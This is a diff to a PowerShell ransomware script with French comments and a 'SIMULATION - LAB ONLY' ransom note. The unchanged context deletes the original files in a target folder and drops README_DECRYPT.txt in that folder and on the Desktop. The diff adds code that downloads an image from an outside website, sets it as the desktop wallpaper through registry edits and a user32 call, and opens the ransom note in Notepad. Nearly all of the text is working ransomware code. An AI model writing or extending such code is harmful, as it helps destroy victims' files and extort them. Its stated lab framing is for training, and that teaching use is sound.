@@ -28,7 +28,7 @@ Get-ChildItem -Path $TARGET -Recurse -File | Where-Object { $_.Extension -ne ".l
     Remove-Item $_.FullName
 }
 
-# Note de rançon sur le Desktop directement
+# Note de rançon
 $note = @"
     ██████╗  █████╗ ███╗   ██╗███████╗ ██████╗ ███╗   ███╗
     ██╔══██╗██╔══██╗████╗  ██║██╔════╝██╔═══██╗████╗ ████║
@@ -44,10 +44,32 @@ $note = @"
     !! CECI EST UNE SIMULATION - LAB ONLY !!
 "@
 
-# Note dans le dossier ET sur le Desktop
 Set-Content "$TARGET\README_DECRYPT.txt" $note
 Set-Content "$DESKTOP\README_DECRYPT.txt" $note
+
+# Télécharger et appliquer le wallpaper
+$wallpaperPath = "$env:TEMP\ransom_wallpaper.jpg"
+Invoke-WebRequest -Uri "http://www.quickmeme.com/img/61/616b011876d9be977c949b9b66d4fc8a1f1f0efb0aeacdc70551605acf4a9490.jpg" -OutFile $wallpaperPath
+
+Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name Wallpaper -Value $wallpaperPath
+Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -Value "10"
+Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -Value "0"
+
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public class Wallpaper {
+    [DllImport("user32.dll", CharSet = CharSet.Auto)]
+    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
+}
+"@
+[Wallpaper]::SystemParametersInfo(20, 0, $wallpaperPath, 3)
+
+# Ouvrir la note automatiquement
+Start-Process "notepad.exe" "$DESKTOP\README_DECRYPT.txt"
 
 Write-Host "[+] Chiffrement termine !"
 Write-Host "[+] Fichiers chiffres dans : $TARGET"
 Write-Host "[+] Note de rancon deposee sur le Desktop"
+Write-Host "[+] Wallpaper change !"
+Write-Host "[+] Note ouverte !"
